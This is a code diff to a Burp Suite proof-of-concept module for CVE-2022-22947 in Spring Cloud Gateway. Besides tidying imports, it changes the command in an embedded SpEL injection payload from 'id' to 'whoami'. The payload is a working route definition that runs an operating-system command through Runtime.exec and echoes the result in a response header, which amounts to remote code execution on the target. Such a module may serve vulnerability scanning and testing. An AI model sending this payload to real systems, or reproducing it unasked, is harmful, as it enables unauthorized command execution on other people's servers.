@@ -2,7 +2,8 @@ package burp.poc;
 
 import burp.*;
 
-import java.util.*;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
 public class spring_CVE_2022_22947 {
 
@@ -20,7 +21,7 @@ public class spring_CVE_2022_22947 {
                 "\"id\": \"hacktest\",\r" +
                 "\"filters\": [{\r" +
                 "\"name\": \"AddResponseHeader\",\r" +
-                "\"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"}\r" +
+                "\"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"whoami\\\"}).getInputStream()))}\"}\r" +
                 "}],\r" +
                 "\"uri\": \"http://example.com\",\r" +
                 "\"order\": 0\r" +
